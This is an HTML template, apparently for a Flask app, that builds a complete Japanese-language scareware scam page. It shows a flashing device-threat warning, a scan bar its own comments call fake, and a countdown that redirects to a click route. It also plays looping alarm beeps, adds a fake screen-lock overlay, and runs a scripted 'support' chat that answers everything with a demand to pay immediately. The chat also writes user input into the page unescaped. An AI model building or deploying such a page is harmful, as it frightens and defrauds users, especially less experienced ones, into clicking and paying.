<!DOCTYPE html>
<html>
<head>
<title>⚠️重大警告⚠️</title>

<style>
body {
    font-family: "Impact", sans-serif;
    margin: 0;
    text-align: center;
    color: yellow;
    background: black;
    animation: flash 0.4s infinite;
}

/* 背景点滅 */
@keyframes flash {
    0% { background:black; }
    50% { background:red; }
    100% { background:black; }
}

/* 大見出し */
h1 {
    font-size: 90px;
    margin: 20px 0;
    text-shadow: 5px 5px 10px black;
}

/* 赤ボタン揺れる */
/* 赤ボタン揺れる（大きく強調） */
.big-btn {
    display: inline-block;
    padding: 60px 100px;      /* 高さ・幅をさらに大きく */
    background: yellow;
    color: red;
    font-size: 100px;         /* フォントも大きく */
    font-weight: bold;
    text-decoration: none;
    border: 12px solid red;
    box-shadow: 15px 15px 0px black;
    animation: wiggle 0.6s infinite; /* 少し速く揺らす */
    border-radius: 10px;
}

/* 揺れアニメーション */
@keyframes wiggle {
    0% { transform: rotate(0deg) scale(1); }
    25% { transform: rotate(4deg) scale(1.05); }
    50% { transform: rotate(0deg) scale(1); }
    75% { transform: rotate(-4deg) scale(1.05); }
    100% { transform: rotate(0deg) scale(1); }
}


/* スキャンバー */
.scan {
    width: 90%;
    height: 60px;
    background: #333;
    border: 6px solid red;
    margin: 40px auto;
}
.scan-bar {
    width: 0%;
    height: 100%;
    background: lime;
}

/* チャット */
#chat {
    position:fixed;
    bottom:20px;
    right:20px;
    width:350px;
    height:450px;
    border:6px solid red;
    background:white;
    display:flex;
    flex-direction:column;
    font-family:Arial;
}
#chatHeader {
    background:red;
    color:white;
    padding:10px;
    font-size:28px;
}
#chatContent {
    flex:1;
    overflow:auto;
    padding:10px;
    font-size:20px;
}
#chatInput {
    border:none;
    border-top:2px solid red;
    padding:10px;
    font-size:20px;
}

/* 画面ロック風 → 背景が触れにくい */
.overlay {
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    pointer-events:none;
}
</style>
</head>

<body>

<h1>⚠️ あなたのデバイスに重大な脅威 ⚠️</h1>

<a href="{{ url_for('ONE.click') }}" class="big-btn">▶▶▶今すぐチェック◀◀◀</a>

<!-- 偽スキャンバー -->
<div class="scan">
    <div id="scanBar" class="scan-bar"></div>
</div>

<!-- カウントダウン -->
<div id="timer" style="font-size:60px;">残り時間：15秒</div>

<!-- チャットサポート -->
<div id="chat">
    <div id="chatHeader">⚠️ サポート</div>
    <div id="chatContent"></div>
    <input id="chatInput" placeholder="質問を入力..." autocomplete="off">
</div>

<!-- 画面ロック風（実際はロックしない） -->
<div class="overlay"></div>

<!-- 警告音 -->
<audio id="beep" src="/static/beep.mp3" autoplay></audio>

<script>
// 1) 偽スキャンバー
let width = 0;
let bar = document.getElementById("scanBar");
let scanLoop = setInterval(() => {
    width += Math.floor(Math.random()*8);
    if(width >= 100){ width = 100; clearInterval(scanLoop); }
    bar.style.width = width + "%";
}, 200);

// 2) カウントダウン
let t = 15;
setInterval(() => {
    if(t <= 0) window.location = "/click";
    document.getElementById("timer").innerHTML = "残り時間：" + t + "秒";
    t--;
}, 1000);

// 3) 警告音自動再生
setInterval(() => {
    document.getElementById("beep").play();
}, 3000);

// 4) チャット自動返信
let chatContent = document.getElementById("chatContent");
let chatInput = document.getElementById("chatInput");
chatInput.addEventListener("keypress", e => {
    if(e.key === "Enter"){
        let msg = chatInput.value;
        chatInput.value = "";
        chatContent.innerHTML += "<div style='color:red'><b>あなた:</b> "+msg+"</div>";
        chatContent.scrollTop = chatContent.scrollHeight;
        setTimeout(() => {
            chatContent.innerHTML += "<div style='color:blue'><b>サポート:</b> 今すぐ支払わないと危険です！</div>";
            chatContent.scrollTop = chatContent.scrollHeight;
        }, 1000);
    }
});
</script>

</body>
</html>
